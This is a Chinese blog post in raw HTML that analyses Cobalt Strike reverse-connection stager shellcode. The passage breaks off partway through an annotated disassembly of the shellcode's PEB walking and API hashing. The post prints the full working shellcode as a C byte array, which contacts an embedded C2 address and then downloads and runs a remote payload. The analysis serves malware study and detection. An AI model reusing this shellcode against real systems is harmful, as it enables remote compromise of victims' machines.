
  <!DOCTYPE html>
  <html lang="zh-CN"  >
  <head>
  <meta charset="utf-8">
  

  

  

  
  <script>window.icon_font = '4552607_tq6stt6tcg';window.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};</script>
  
  
  <title>
    cobalt strike后门木马shellcode分析 |
    
    Aiyakami的博客
  </title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
  
    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_tq6stt6tcg.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  
  
  
    <meta name="description" content="其reversetcp的shellcode如下，主要是看和msf的有什么区别 1unsigned char buf[] &#x3D; &quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac">
<meta property="og:type" content="article">
<meta property="og:title" content="cobalt strike后门木马shellcode分析">
<meta property="og:url" content="http://example.com/2025/02/10/cobalt%20strike%E5%90%8E%E9%97%A8%E6%9C%A8%E9%A9%ACshellcode%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="Aiyakami的博客">
<meta property="og:description" content="其reversetcp的shellcode如下，主要是看和msf的有什么区别 1unsigned char buf[] &#x3D; &quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://aiyakami.github.io/about/10/network-asset-asynccode-20250210180335-mqp2vau.png">
<meta property="og:image" content="https://aiyakami.github.io/about/10/network-asset-asynccode-20250210180335-fh4wcdc.png">
<meta property="og:image" content="https://aiyakami.github.io/about/10/network-asset-asynccode-20250210180335-p84gbxv.png">
<meta property="og:image" content="https://aiyakami.github.io/about/10/network-asset-asynccode-20250210180336-jelfo4e.png">
<meta property="og:image" content="https://aiyakami.github.io/about/10/network-asset-asynccode-20250210180336-6u3eqga.png">
<meta property="og:image" content="https://aiyakami.github.io/about/10/network-asset-asynccode-20250210180336-vjsojlz.png">
<meta property="og:image" content="https://aiyakami.github.io/about/10/network-asset-asynccode-20250210180336-wspe9px.png">
<meta property="og:image" content="https://aiyakami.github.io/about/10/network-asset-asynccode-20250210180336-r9n4jhf.png">
<meta property="og:image" content="https://aiyakami.github.io/about/10/network-asset-asynccode-20250210180336-y3rb886.png">
<meta property="og:image" content="https://aiyakami.github.io/about/10/network-asset-asynccode-20250210180337-eu1zvji.png">
<meta property="og:image" content="https://aiyakami.github.io/about/10/network-asset-asynccode-20250210180337-479d0xh.png">
<meta property="og:image" content="https://aiyakami.github.io/about/10/network-asset-asynccode-20250210180337-i2cizhh.png">
<meta property="article:published_time" content="2025-02-10T10:06:28.336Z">
<meta property="article:modified_time" content="2025-02-10T10:06:53.677Z">
<meta property="article:author" content="aiyakami">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://aiyakami.github.io/about/10/network-asset-asynccode-20250210180335-mqp2vau.png">
  
  
    <link rel="alternate" href="/atom.xml" title="Aiyakami的博客" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/images/favicon.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
  
  
  
  
    
<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>

  
  
    
<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.0.1/dist/aos.css">

  
<meta name="generator" content="Hexo 7.3.0"></head>

  <body>
    
<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
</div>


    <div id="container">
      <div id="wrap">
        <div id="header-nav">
  <nav id="main-nav">
    
      <span class="main-nav-link-wrap">
        <div class="main-nav-icon icon-taichi"></div>
        <a class="main-nav-link" href="/">首页</a>
      </span>
    
      <span class="main-nav-link-wrap">
        <div class="main-nav-icon icon-taichi"></div>
        <a class="main-nav-link" href="/archives">归档</a>
      </span>
    
      <span class="main-nav-link-wrap">
        <div class="main-nav-icon icon-taichi"></div>
        <a class="main-nav-link" href="/about">关于</a>
      </span>
    
      <span class="main-nav-link-wrap">
        <div class="main-nav-icon icon-taichi"></div>
        <a class="main-nav-link" href="/friend">友链</a>
      </span>
    
    <a id="main-nav-toggle" class="nav-icon"></a>
  </nav>
  <nav id="sub-nav">
    
      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
    
    
    
  </nav>
</div>
<header id="header">
  
    
      <img fetchpriority="high" src="/images/banner.webp" alt="cobalt strike后门木马shellcode分析">
    
  
  <div id="header-outer">
    <div id="header-title">
      
        
        
          <a href="/" id="logo">
            <h1 data-aos="slide-up">cobalt strike后门木马shellcode分析</h1>
          </a>
        
      
      
        
        <h2 id="subtitle-wrap" data-aos="slide-down">
          
        </h2>
      
    </div>
  </div>
</header>

        <div id="content">
          
          <section id="main"><article id="post-cobalt strike后门木马shellcode分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-inner" data-aos="fade-up">
    <div class="article-meta">
      <div class="article-date">
  <a href="/2025/02/10/cobalt%20strike%E5%90%8E%E9%97%A8%E6%9C%A8%E9%A9%ACshellcode%E5%88%86%E6%9E%90/" class="article-date-link" data-aos="zoom-in">
    <time datetime="2025-02-10T10:06:28.336Z" itemprop="datePublished">2025-02-10</time>
    <time style="display: none;" id="post-update-time">2025-02-10</time>
  </a>
</div>

      

    </div>
    <div class="hr-line"></div>
    

    <div class="e-content article-entry" itemprop="articleBody">
      
      
        <p>其reversetcp的shellcode如下，主要是看和msf的有什么区别</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unsigned <span class="type">char</span> buf[] <span class="operator">=</span> &quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x50\x00\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x56\x6f\x45\x52\x00\xd6\x19\xbf\xb3\x2b\x27\xcb\x50\xae\x57\x29\x7c\x22\xd8\x00\x04\x44\xc6\x31\x32\xd3\x2d\x7c\xa7\x76\x61\xa1\x6f\x79\x77\x26\xa0\x1f\x81\x0d\xd2\x7e\x6a\x8f\xb3\xa6\xae\xa6\xa6\x3e\x24\xa0\x27\x95\xc9\x67\xc4\xa3\x81\x20\xb5\x51\x20\xab\xd0\xe4\x42\x78\xad\xd1\x3a\x9f\x60\x7d\xb7\xac\x4b\xa2\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x4d\x41\x54\x50\x3b\x20\x4d\x41\x54\x50\x29\x0d\x0a\x00\xe4\xdd\x30\xaf\x86\x10\xa0\x09\x68\x0f\x28\xc0\x40\xb9\xf5\x65\x9d\x39\x34\x4d\xf6\x72\x09\x80\x54\x41\xe8\x0d\x89\x14\x08\x0e\xf9\x3f\x08\xa3\x2e\xd9\x56\x68\x1b\x8b\x7a\x1f\xda\xb3\x65\x01\x6e\x62\x3a\x4c\x11\xb8\xec\x11\x6c\xef\x90\xa4\x73\x4a\xca\xc3\x95\x88\xf0\x21\x0e\x9b\x5a\x24\x70\x64\x44\x70\x13\x01\xf0\xbc\xb9\xe0\xa0\xcb\xc2\xc9\xf5\x7c\xbe\xc8\x9a\xfd\xca\x6a\x89\x3c\x6e\x01\xa0\x21\xf3\x52\xb1\x43\x60\xba\x2c\xc6\x55\x31\x72\x0d\xd3\x0d\x0a\x98\x4e\xae\xa6\xa3\x52\x3c\x03\xa7\x36\xcb\x68\xd0\xe0\x91\x2b\xa5\xb3\x52\x51\xdb\xa1\x5c\xf5\x4f\xc0\xfc\xad\x35\x80\x91\xb5\x79\xd4\x0e\xca\x4a\x57\x6d\xc6\xb5\x89\x36\x81\x77\x20\x2f\xb8\x3a\x10\x48\x41\xfb\x88\xc5\x17\xc5\x0d\x5f\xb1\x77\xc0\x30\xc7\x6e\xa1\x4f\xa1\x16\x83\x5d\x36\x7b\xf2\x5a\xf1\x21\xe0\x88\x2b\xf4\x47\xfa\x97\xdb\x2e\xf8\x12\xf6\xd5\x85\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x30\x2e\x32\x00\x3a\xde\x68\xb1&quot;;</span><br></pre></td></tr></table></figure>

<p>最先开始的是初始化代码，后续汇编可以分两个部分</p>
<p>1：通过hash值调用指定函数</p>
<p>2：反连C2端，主动请求远端shellcode并执行</p>
<p>下面是首先跳转到第二部分汇编，也就是反连C2端</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>D44058 <span class="operator">&lt;</span>cs_shellcode.unsigned <span class="type">char</span> <span class="operator">*</span>buf<span class="operator">&gt;</span>       <span class="operator">|</span> FC                          <span class="operator">|</span> cld                                             <span class="operator">|</span></span><br><span class="line"><span class="number">00</span>D44059                                         <span class="operator">|</span> E8 <span class="number">89000000</span>                 <span class="operator">|</span> <span class="keyword">call</span> cs_shellcode.D440E7</span><br></pre></td></tr></table></figure>

<p>通过hash值调用指定函数部分，最开始的汇编代码实现的函数一样是根据传入的参数，调用对应的函数，手法于MSF的后门一模一样，一个汇编代码都没变，仍然是传入hash值，然后遍历模块与导出函数的hash值，比对成功就调用</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">根据传入的hash值调用目标函数</span><br><span class="line"> <span class="number">00</span>D4405E                                         <span class="operator">|</span> <span class="number">60</span>                          <span class="operator">|</span> pushad                                          <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D4405F                                         <span class="operator">|</span> <span class="number">89E5</span>                        <span class="operator">|</span> mov ebp,esp                                     <span class="operator">|</span></span><br><span class="line"> 获取PEB，通过PEB获取模块地址和模块名称</span><br><span class="line"> <span class="number">00</span>D44061                                         <span class="operator">|</span> <span class="number">31</span>D2                        <span class="operator">|</span> xor edx,edx                                     <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D44063                                         <span class="operator">|</span> <span class="number">64</span>:<span class="number">8</span>B52 <span class="number">30</span>                  <span class="operator">|</span> mov edx,dword ptr fs:[edx<span class="operator">+</span><span class="number">30</span>]                   <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D44067                                         <span class="operator">|</span> <span class="number">8</span>B52 <span class="number">0</span>C                     <span class="operator">|</span> mov edx,dword ptr ds:[edx<span class="operator">+</span>C]                    <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D4406A                                         <span class="operator">|</span> <span class="number">8</span>B52 <span class="number">14</span>                     <span class="operator">|</span> mov edx,dword ptr ds:[edx<span class="operator">+</span><span class="number">14</span>]                   <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D4406D                                         <span class="operator">|</span> <span class="number">8</span>B72 <span class="number">28</span>                     <span class="operator">|</span> mov esi,dword ptr ds:[edx<span class="operator">+</span><span class="number">28</span>]                   <span class="operator">|</span> esi:<span class="operator">&amp;</span>&quot;C:\Users\At\Desktop\CS_ShellCode.exe&quot;</span><br><span class="line"> <span class="number">00</span>D44070                                         <span class="operator">|</span> <span class="number">0</span>FB74A <span class="number">26</span>                   <span class="operator">|</span> movzx ecx,word ptr ds:[edx<span class="operator">+</span><span class="number">26</span>]                  <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D44074                                         <span class="operator">|</span> <span class="number">31</span>FF                        <span class="operator">|</span> xor edi,edi                                     <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\ProgramData&quot;</span><br><span class="line"> 处理模块名称，如果是小写就转为大写</span><br><span class="line"> <span class="number">00</span>D44076                                         <span class="operator">|</span> <span class="number">31</span>C0                        <span class="operator">|</span> xor eax,eax                                     <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"> <span class="number">00</span>D44078                                         <span class="operator">|</span> AC                          <span class="operator">|</span> lodsb                                           <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D44079                                         <span class="operator">|</span> <span class="number">3</span>C <span class="number">61</span>                       <span class="operator">|</span> cmp al,<span class="number">61</span>                                       <span class="operator">|</span> <span class="number">61</span>:<span class="string">&#x27;a&#x27;</span></span><br><span class="line"> <span class="number">00</span>D4407B                                         <span class="operator">|</span> <span class="number">7</span>C <span class="number">02</span>                       <span class="operator">|</span> jl cs_shellcode.D4407F                          <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D4407D                                         <span class="operator">|</span> <span class="number">2</span>C <span class="number">20</span>                       <span class="operator">|</span> sub al,<span class="number">20</span>                                       <span class="operator">|</span></span><br><span class="line"> 计算上面模块名称的hash值，计算算为每个字节右旋<span class="number">13</span>相加，而不像之前所了解到的sha1那么复杂</span><br><span class="line"> <span class="number">00</span>D4407F                                         <span class="operator">|</span> C1CF <span class="number">0</span>D                     <span class="operator">|</span> ror edi,D                                       <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\ProgramData&quot;</span><br><span class="line"> <span class="number">00</span>D44082                                         <span class="operator">|</span> <span class="number">01</span>C7                        <span class="operator">|</span> <span class="keyword">add</span> edi,eax                                     <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\ProgramData&quot;, eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"> <span class="number">00</span>D44084                                         <span class="operator">|</span> E2 F0                       <span class="operator">|</span> loop cs_shellcode.D44076                        <span class="operator">|</span></span><br><span class="line"> 通过模块地址获取模块中的导出表中的函数，下面的edx为模块所在地址，edi为模块名称的hash值</span><br><span class="line"> <span class="number">00</span>D44086                                         <span class="operator">|</span> <span class="number">52</span>                          <span class="operator">|</span> push edx                                        <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D44087                                         <span class="operator">|</span> <span class="number">57</span>                          <span class="operator">|</span> push edi                                        <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\ProgramData&quot;</span><br><span class="line"> <span class="number">00</span>D44088                                         <span class="operator">|</span> <span class="number">8</span>B52 <span class="number">10</span>                     <span class="operator">|</span> mov edx,dword ptr ds:[edx<span class="operator">+</span><span class="number">10</span>]                   <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D4408B                                         <span class="operator">|</span> <span class="number">8</span>B42 <span class="number">3</span>C                     <span class="operator">|</span> mov eax,dword ptr ds:[edx<span class="operator">+</span><span class="number">3</span>C]                   <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"> <span class="number">00</span>D4408E                                         <span class="operator">|</span> <span class="number">01</span>D0                        <span class="operator">|</span> <span class="keyword">add</span> eax,edx                                     <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"> <span class="number">00</span>D44090                                         <span class="operator">|</span> <span class="number">8</span>B40 <span class="number">78</span>                     <span class="operator">|</span> mov eax,dword ptr ds:[eax<span class="operator">+</span><span class="number">78</span>]                   <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf, dword ptr ds:[eax<span class="operator">+</span><span class="number">78</span>]:buf<span class="operator">+</span><span class="number">78</span></span><br><span class="line"> <span class="number">00</span>D44093                                         <span class="operator">|</span> <span class="number">85</span>C0                        <span class="operator">|</span> test eax,eax                                    <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"> <span class="number">00</span>D44095                                         <span class="operator">|</span> <span class="number">74</span> <span class="number">4</span>A                       <span class="operator">|</span> je cs_shellcode.D440E1                          <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D44097                                         <span class="operator">|</span> <span class="number">01</span>D0                        <span class="operator">|</span> <span class="keyword">add</span> eax,edx                                     <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"> <span class="number">00</span>D44099                                         <span class="operator">|</span> <span class="number">50</span>                          <span class="operator">|</span> push eax                                        <span class="operator">|</span> eax:unsigned <span class="type">char</span> buf</span><br><span class="line"> <span class="number">00</span>D4409A                                         <span class="operator">|</span> <span class="number">8</span>B48 <span class="number">18</span>                     <span class="operator">|</span> mov ecx,dword ptr ds:[eax<span class="operator">+</span><span class="number">18</span>]                   <span class="operator">|</span> dword ptr ds:[eax<span class="operator">+</span><span class="number">18</span>]:buf<span class="operator">+</span><span class="number">18</span></span><br><span class="line"> <span class="number">00</span>D4409D                                         <span class="operator">|</span> <span class="number">8</span>B58 <span class="number">20</span>                     <span class="operator">|</span> mov ebx,dword ptr ds:[eax<span class="operator">+</span><span class="number">20</span>]                   <span class="operator">|</span> dword ptr ds:[eax<span class="operator">+</span><span class="number">20</span>]:buf<span class="operator">+</span><span class="number">20</span></span><br><span class="line"> <span class="number">00</span>D440A0                                         <span class="operator">|</span> <span class="number">01</span>D3                        <span class="operator">|</span> <span class="keyword">add</span> ebx,edx                                     <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D440A2                                         <span class="operator">|</span> E3 <span class="number">3</span>C                       <span class="operator">|</span> jecxz cs_shellcode.D440E0                       <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D440A4                                         <span class="operator">|</span> <span class="number">49</span>                          <span class="operator">|</span> <span class="type">dec</span> ecx                                         <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D440A5                                         <span class="operator">|</span> <span class="number">8</span>B348B                      <span class="operator">|</span> mov esi,dword ptr ds:[ebx<span class="operator">+</span>ecx4]                <span class="operator">|</span> esi:<span class="operator">&amp;</span>&quot;C:\Users\At\Desktop\CS_ShellCode.exe&quot;</span><br><span class="line"> <span class="number">00</span>D440A8                                         <span class="operator">|</span> <span class="number">01</span>D6                        <span class="operator">|</span> <span class="keyword">add</span> esi,edx                                     <span class="operator">|</span> esi:<span class="operator">&amp;</span>&quot;C:\Users\At\Desktop\CS_ShellCode.exe&quot;</span><br><span class="line"> <span class="number">00</span>D440AA                                         <span class="operator">|</span> <span class="number">31</span>FF                        <span class="operator">|</span> xor edi,edi                                     <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\ProgramData&quot;</span><br><span class="line"> <span class="number">00</span>D440AC                                         <span class="operator">|</span> <span class="number">31</span>C0                        <span class="operator">|</span> xor eax,eax                                     <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"> <span class="number">00</span>D440AE                                         <span class="operator">|</span> AC                          <span class="operator">|</span> lodsb                                           <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D440AF                                         <span class="operator">|</span> C1CF <span class="number">0</span>D                     <span class="operator">|</span> ror edi,D                                       <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\ProgramData&quot;</span><br><span class="line"> <span class="number">00</span>D440B2                                         <span class="operator">|</span> <span class="number">01</span>C7                        <span class="operator">|</span> <span class="keyword">add</span> edi,eax                                     <span class="operator">|</span> edi:<span class="operator">&amp;</span>&quot;ALLUSERSPROFILE=C:\ProgramData&quot;, eax:unsigned <span class="type">char</span> buf</span><br><span class="line"> <span class="number">00</span>D440B4                                         <span class="operator">|</span> <span class="number">38E0</span>                        <span class="operator">|</span> cmp al,ah                                       <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D440B6                                         <span class="operator">|</span> <span class="number">75</span> F4                       <span class="operator">|</span> jne cs_shellcode.D440AC                         <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D440B8                                         <span class="operator">|</span> <span class="number">037</span>D F8                     <span class="operator">|</span> <span class="keyword">add</span> edi,dword ptr ss:[ebp<span class="number">-8</span>]                    <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D440BB                                         <span class="operator">|</span> <span class="number">3</span>B7D <span class="number">24</span>                     <span class="operator">|</span> cmp edi,dword ptr ss:[ebp<span class="operator">+</span><span class="number">24</span>]                   <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D440BE                                         <span class="operator">|</span> <span class="number">75</span> E2                       <span class="operator">|</span> jne cs_shellcode.D440A2                         <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D440C0                                         <span class="operator">|</span> <span class="number">58</span>                          <span class="operator">|</span> pop eax                                         <span class="operator">|</span> eax:unsigned <span class="type">char</span> buf</span><br><span class="line"> <span class="number">00</span>D440C1                                         <span class="operator">|</span> <span class="number">8</span>B58 <span class="number">24</span>                     <span class="operator">|</span> mov ebx,dword ptr ds:[eax<span class="operator">+</span><span class="number">24</span>]                   <span class="operator">|</span> dword ptr ds:[eax<span class="operator">+</span><span class="number">24</span>]:buf<span class="operator">+</span><span class="number">24</span></span><br><span class="line"> <span class="number">00</span>D440C4                                         <span class="operator">|</span> <span class="number">01</span>D3                        <span class="operator">|</span> <span class="keyword">add</span> ebx,edx                                     <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D440C6                                         <span class="operator">|</span> <span class="number">66</span>:<span class="number">8</span>B0C4B                   <span class="operator">|</span> mov cx,word ptr ds:[ebx<span class="operator">+</span>ecx2]                  <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D440CA                                         <span class="operator">|</span> <span class="number">8</span>B58 <span class="number">1</span>C                     <span class="operator">|</span> mov ebx,dword ptr ds:[eax<span class="operator">+</span><span class="number">1</span>C]                   <span class="operator">|</span> dword ptr ds:[eax<span class="operator">+</span><span class="number">1</span>C]:buf<span class="operator">+</span><span class="number">1</span>C</span><br><span class="line"> <span class="number">00</span>D440CD                                         <span class="operator">|</span> <span class="number">01</span>D3                        <span class="operator">|</span> <span class="keyword">add</span> ebx,edx                                     <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D440CF                                         <span class="operator">|</span> <span class="number">8</span>B048B                      <span class="operator">|</span> mov eax,dword ptr ds:[ebx<span class="operator">+</span>ecx4]                <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"> <span class="number">00</span>D440D2                                         <span class="operator">|</span> <span class="number">01</span>D0                        <span class="operator">|</span> <span class="keyword">add</span> eax,edx                                     <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"> <span class="number">00</span>D440D4                                         <span class="operator">|</span> <span class="number">894424</span> <span class="number">24</span>                   <span class="operator">|</span> mov dword ptr ss:[esp<span class="operator">+</span><span class="number">24</span>],eax                   <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"> <span class="number">00</span>D440D8                                         <span class="operator">|</span> <span class="number">5</span>B                          <span class="operator">|</span> pop ebx                                         <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D440D9                                         <span class="operator">|</span> <span class="number">5</span>B                          <span class="operator">|</span> pop ebx                                         <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D440DA                                         <span class="operator">|</span> <span class="number">61</span>                          <span class="operator">|</span> popad                                           <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D440DB                                         <span class="operator">|</span> <span class="number">59</span>                          <span class="operator">|</span> pop ecx                                         <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D440DC                                         <span class="operator">|</span> <span class="number">5</span>A                          <span class="operator">|</span> pop edx                                         <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D440DD                                         <span class="operator">|</span> <span class="number">51</span>                          <span class="operator">|</span> push ecx                                        <span class="operator">|</span></span><br><span class="line"> <span class="number">00</span>D440DE                                         <span class="operator">|</span> FFE0                        <span class="operator">|</span> jmp eax      调用目标函数                                        <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"> <span class="number">00</span>D440E0                                         <span class="operator">|</span> <span class="number">58</span>                          <span class="operator">|</span> pop eax                                         <span class="operator">|</span> eax:unsigned <span class="type">char</span> <span class="operator">*</span>buf</span><br><span class="line"> <span class="number">00</span>D440E1                                         <span class="operator">|</span> <span class="number">5</span>F                          <span class="operator">|</span> pop edi                                         <span class="operator">|</span> edi:<span 